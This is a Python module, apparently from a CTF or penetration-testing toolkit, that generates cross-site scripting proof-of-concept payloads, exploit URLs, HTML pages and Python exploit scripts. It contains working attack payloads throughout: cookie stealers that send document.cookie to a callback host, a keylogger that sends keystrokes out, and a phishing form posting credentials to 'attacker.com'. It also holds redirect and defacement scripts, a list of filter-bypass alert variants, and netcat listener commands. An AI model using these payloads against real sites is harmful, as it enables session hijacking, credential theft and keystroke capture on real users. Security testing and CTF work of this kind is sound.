"""XSS PoC Generator for CTF challenges."""

from dataclasses import dataclass
from typing import Optional
from urllib.parse import quote, urlencode

from .poc_generator import PocGenerator, PocResult, PocType


@dataclass
class XssPayloadConfig:
    """Configuration for XSS payload generation."""
    callback_url: Optional[str] = None
    cookie_name: str = "session"
    custom_js: Optional[str] = None
    exfil_method: str = "img"  # img, fetch, xhr
    encoding: str = "none"  # none, url, double_url, base64, html


class XssPocGenerator(PocGenerator):
    """Generate XSS PoC for CTF challenges."""
    
    # HTML template for standalone PoC page
    HTML_TEMPLATE = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>XSS PoC - {title}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; background: #1a1a2e; color: #eee; }}
        .container {{ max-width: 800px; margin: 0 auto; }}
        h1 {{ color: #e94560; }}
        .info {{ background: #16213e; padding: 20px; border-radius: 8px; margin: 20px 0; }}
        .payload {{ background: #0f3460; padding: 15px; border-radius: 4px; font-family: monospace; 
                   word-break: break-all; margin: 10px 0; }}
        .btn {{ background: #e94560; color: white; padding: 12px 24px; border: none; 
               border-radius: 4px; cursor: pointer; font-size: 16px; margin: 5px; }}
        .btn:hover {{ background: #ff6b6b; }}
        .warning {{ color: #ffd93d; margin: 20px 0; }}
        a {{ color: #4cc9f0; }}
        .evidence {{ background: #1f4068; padding: 15px; border-radius: 4px; margin: 10px 0; }}
        #result {{ margin-top: 20px; padding: 15px; background: #0a0a0a; border-radius: 4px; 
                  min-height: 100px; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>XSS Proof of Concept</h1>
        
        <div class="info">
            <h3>Target Information</h3>
            <p><strong>Target URL:</strong> <a href="{target_url}" target="_blank">{target_url}</a></p>
            <p><strong>Vulnerable Parameter:</strong> {param}</p>
            <p><strong>XSS Type:</strong> {xss_type}</p>
        </div>
        
        <div class="info">
            <h3>Payload</h3>
            <div class="payload">{payload_escaped}</div>
        </div>
        
        <div class="info">
            <h3>Exploit URL</h3>
            <div class="payload"><a href="{exploit_url}" target="_blank">{exploit_url}</a></div>
        </div>
        
        {extra_content}
        
        <div class="warning">
            <strong>⚠️ Warning:</strong> This PoC is for authorized security testing only.
            Unauthorized use is illegal.
        </div>
        
        <div class="info">
            <h3>Evidence</h3>
            <div class="evidence">
                <p><strong>Generated:</strong> {timestamp}</p>
                <p><strong>Steps to Reproduce:</strong></p>
                <ol>
                    {steps_html}
                </ol>
                <p><strong>Expected Result:</strong> {expected_result}</p>
            </div>
        </div>
        
        <div id="result"></div>
    </div>
    
    {script_content}
</body>
</html>
"""

    # Cookie stealer payload templates
    COOKIE_STEALER_PAYLOADS = {
        "img": """<script>new Image().src="{callback}?c="+document.cookie</script>""",
        "fetch": """<script>fetch("{callback}?c="+document.cookie)</script>""",
        "xhr": """<script>var x=new XMLHttpRequest();x.open("GET","{callback}?c="+document.cookie);x.send()</script>""",
        "img_onerror": """<img src=x onerror="new Image().src='{callback}?c='+document.cookie">""",
        "svg": """<svg onload="new Image().src='{callback}?c='+document.cookie">""",
    }
    
    # Alert payloads for simple PoC
    ALERT_PAYLOADS = {
        "basic": """<script>alert('XSS')</script>""",
        "document_domain": """<script>alert(document.domain)</script>""",
        "document_cookie": """<script>alert(document.cookie)</script>""",
        "img": """<img src=x onerror="alert('XSS')">""",
        "svg": """<svg onload="alert('XSS')">""",
        "body": """<body onload="alert('XSS')">""",
        "input": """<input onfocus="alert('XSS')" autofocus>""",
        "marquee": """<marquee onstart="alert('XSS')">""",
        "details": """<details open ontoggle="alert('XSS')">""",
        "video": """<video src=x onerror="alert('XSS')">""",
        "audio": """<audio src=x onerror="alert('XSS')">""",
        "iframe": """<iframe src="javascript:alert('XSS')">""",
        "math": """<math><mtext><table><mglyph><style><img src=x onerror="alert('XSS')">""",
    }
    
    # Keylogger payload
    KEYLOGGER_PAYLOAD = """<script>
document.onkeypress=function(e){{
    new Image().src="{callback}?k="+e.key;
}}
</script>"""

    # DOM manipulation payloads
    DOM_PAYLOADS = {
        "redirect": """<script>window.location="{url}"</script>""",
        "phishing_form": """<script>
document.body.innerHTML='<form action="{callback}" method="POST"><h2>Session Expired</h2><input name="user" placeholder="Username"><input name="pass" type="password" placeholder="Password"><button>Login</button></form>';
</script>""",
        "defacement": """<script>document.body.innerHTML='<h1 style="color:red;font-size:72px;text-align:center">HACKED</h1>'</script>""",
        "crypto_miner": """<script>
// PoC: Would load crypto miner here
console.log("Crypto miner would execute here");
alert("Crypto miner PoC - Check console");
</script>""",
    }
    
    def generate(
        self,
        poc_type: str = "alert",
        callback_url: Optional[str] = None,
        exfil_method: str = "img",
        output_dir: str = ".",
        save_html: bool = True,
        custom_payload: Optional[str] = None,
        encoding: str = "none",
    ) -> PocResult:
        """
        Generate XSS PoC.
        
        Args:
            poc_type: Type of PoC (alert, cookie_stealer, keylogger, phishing, redirect, defacement)
            callback_url: URL for exfiltration (required for cookie_stealer, keylogger)
            exfil_method: Exfiltration method (img, fetch, xhr, img_onerror, svg)
            output_dir: Directory to save HTML file
            save_html: Whether to save standalone HTML file
            custom_payload: Custom XSS payload to use
            encoding: Payload encoding (none, url, double_url, base64, html)
        
        Returns:
            PocResult with generated PoC
        """
        # Generate payload based on type
        if custom_payload:
            payload = custom_payload
            evidence_desc = "Custom XSS payload execution"
        elif poc_type == "alert":
            payload = self.ALERT_PAYLOADS.get(exfil_method, self.ALERT_PAYLOADS["basic"])
            evidence_desc = "JavaScript alert() executed, demonstrating arbitrary JS execution"
        elif poc_type == "cookie_stealer":
            if not callback_url:
                raise ValueError("callback_url is required for cookie_stealer")
            template = self.COOKIE_STEALER_PAYLOADS.get(exfil_method, self.COOKIE_STEALER_PAYLOADS["img"])
            payload = template.format(callback=callback_url)
            evidence_desc = f"Cookies exfiltrated to {callback_url}"
        elif poc_type == "keylogger":
            if not callback_url:
                raise ValueError("callback_url is required for keylogger")
            payload = self.KEYLOGGER_PAYLOAD.format(callback=callback_url)
            evidence_desc = f"Keystrokes captured and sent to {callback_url}"
        elif poc_type == "phishing":
            callback = callback_url or "https://attacker.com/phish"
            payload = self.DOM_PAYLOADS["phishing_form"].format(callback=callback)
            evidence_desc = "Fake login form injected to steal credentials"
        elif poc_type == "redirect":
            redirect_url = callback_url or "https://attacker.com/"
            payload = self.DOM_PAYLOADS["redirect"].format(url=redirect_url)
            evidence_desc = f"User redirected to {redirect_url}"
        elif poc_type == "defacement":
            payload = self.DOM_PAYLOADS["defacement"]
            evidence_desc = "Page defaced with custom content"
        else:
            payload = self.ALERT_PAYLOADS["basic"]
            evidence_desc = "XSS vulnerability demonstrated with alert()"
        
        # Apply encoding
        encoded_payload = self._encode_payload(payload, encoding)
        
        # Build exploit URL
        exploit_url = self.build_url_with_payload(encoded_payload)
        
        # Generate curl command
        curl_cmd = self.generate_curl_command(exploit_url)
        
        # Generate Python script
        python_script = self._generate_python_script(exploit_url, payload, poc_type, callback_url)
        
        # Steps to reproduce
        steps = [
            f"Open the target URL: {self.target_url}",
            f"Inject the payload into the '{self.param}' parameter",
            "Observe the JavaScript execution in the browser",
        ]
        
        if poc_type == "cookie_stealer":
            steps.append(f"Check your callback server at {callback_url} for stolen cookies")
        elif poc_type == "keylogger":
            steps.append(f"Type on the page and check {callback_url} for captured keystrokes")
        
        # Expected result
        expected = {
            "alert": "An alert box appears with 'XSS' or document information",
            "cookie_stealer": "Session cookies are sent to the attacker's server",
            "keylogger": "All keystrokes are captured and exfiltrated",
            "phishing": "A fake login form replaces the page content",
            "redirect": "User is redirected to the attacker's URL",
            "defacement": "Page content is replaced with 'HACKED' message",
        }.get(poc_type, "JavaScript executes in the context of the target domain")
        
        # Create result
        result = PocResult(
            poc_type=PocType.XSS_REFLECTED,
            target_url=self.target_url,
            payload=payload,
            curl_command=curl_cmd,
            python_script=python_script,
            evidence_description=evidence_desc,
            steps_to_reproduce=steps,
            expected_result=expected,
            callback_url=callback_url,
        )
        
        # Save HTML file
        if save_html:
            html_content = self._generate_html(
                payload=payload,
                encoded_payload=encoded_payload,
                exploit_url=exploit_url,
                poc_type=poc_type,
                callback_url=callback_url,
                steps=steps,
                expected=expected,
            )
            filename = f"xss_poc_{poc_type}.html"
            result.html_file = self.save_html(html_content, filename, output_dir)
        
        return result
    
    def generate_all_payloads(self, callback_url: Optional[str] = None) -> list[dict]:
        """Generate all available XSS payloads."""
        payloads = []
        
        # Alert payloads
        for name, payload in self.ALERT_PAYLOADS.items():
            payloads.append({
                "type": "alert",
                "variant": name,
                "payload": payload,
                "description": f"Alert-based XSS using {name} technique",
            })
        
        # Cookie stealer payloads
        if callback_url:
            for name, template in self.COOKIE_STEALER_PAYLOADS.items():
                payloads.append({
                    "type": "cookie_stealer",
                    "variant": name,
                    "payload": template.format(callback=callback_url),
                    "description": f"Cookie stealer using {name} technique",
                })
        
        return payloads
    
    def _encode_payload(self, payload: str, encoding: str) -> str:
        """Apply encoding to payload."""
        if encoding == "none":
            return payload
        elif encoding == "url":
            return quote(payload)
        elif encoding == "double_url":
            return quote(quote(payload))
        elif encoding == "base64":
            import base64
            return base64.b64encode(payload.encode()).decode()
        elif encoding == "html":
            return "".join(f"&#{ord(c)};" for c in payload)
        else:
            return payload
    
    def _generate_html(
        self,
        payload: str,
        encoded_payload: str,
        exploit_url: str,
        poc_type: str,
        callback_url: Optional[str],
        steps: list[str],
        expected: str,
    ) -> str:
        """Generate standalone HTML PoC page."""
        from datetime import datetime
        
        steps_html = "\n".join(f"<li>{step}</li>" for step in steps)
        
        # Extra content based on PoC type
        extra_content = ""
        script_content = ""
        
        if poc_type == "alert":
            extra_content = """
        <div class="info">
            <h3>Test Locally</h3>
            <p>Click the button below to test the payload:</p>
            <button class="btn" onclick="testPayload()">Execute Payload</button>
        </div>
"""
            script_content = f"""
    <script>
        function testPayload() {{
            alert('XSS');
            document.getElementById('result').innerHTML = '<p style="color: #4cc9f0;">✓ XSS payload executed successfully!</p>';
        }}
    </script>
"""
        elif poc_type == "cookie_stealer":
            extra_content = f"""
        <div class="info">
            <h3>Callback Server</h3>
            <p>Set up a listener on: <code>{callback_url}</code></p>
            <p>Example with Python: <code>python3 -m http.server 8888</code></p>
            <p>Example with netcat: <code>nc -lvnp 8888</code></p>
        </div>
"""
        
        return self.HTML_TEMPLATE.format(
            title=f"{poc_type.upper()} PoC",
            target_url=self.escape_html(self.target_url),
            param=self.param or "N/A",
            xss_type=poc_type.replace("_", " ").title(),
            payload_escaped=self.escape_html(payload),
            exploit_url=self.escape_html(exploit_url),
            extra_content=extra_content,
            timestamp=datetime.now().isoformat(),
            steps_html=steps_html,
            expected_result=expected,
            script_content=script_content,
        )
    
    def _generate_python_script(
        self,
        exploit_url: str,
        payload: str,
        poc_type: str,
        callback_url: Optional[str],
    ) -> str:
        """Generate Python exploit script."""
        script = f'''#!/usr/bin/env python3
"""
XSS PoC Script - {poc_type}
Target: {self.target_url}
"""

import requests
from urllib.parse import quote

TARGET_URL = "{self.target_url}"
PARAM = "{self.param}"
PAYLOAD = """{payload}"""

def exploit():
    """Execute XSS exploit."""
    
    # Build exploit URL
    exploit_url = "{exploit_url}"
    
    print(f"[*] Target: {{TARGET_URL}}")
    print(f"[*] Parameter: {{PARAM}}")
    print(f"[*] Payload: {{PAYLOAD[:50]}}...")
    print(f"[*] Exploit URL: {{exploit_url}}")
    print()
    
    # Send request
    try:
        response = requests.get(exploit_url, timeout=10)
        
        if PAYLOAD in response.text or "<script>" in response.text.lower():
            print("[+] SUCCESS: Payload reflected in response!")
            print(f"[+] Status Code: {{response.status_code}}")
            print(f"[+] Content Length: {{len(response.text)}}")
            return True
        else:
            print("[-] Payload not found in response")
            print("[*] The payload might be filtered or encoded")
            return False
            
    except Exception as e:
        print(f"[-] Error: {{e}}")
        return False

if __name__ == "__main__":
    print("=" * 60)
    print("XSS Proof of Concept")
    print("=" * 60)
    print()
    exploit()
'''
        
        if callback_url:
            script += f'''
    print()
    print("[*] Callback URL: {callback_url}")
    print("[*] Make sure to have a listener running:")
    print("    python3 -m http.server 8888")
    print("    or: nc -lvnp 8888")
'''
        
        return script
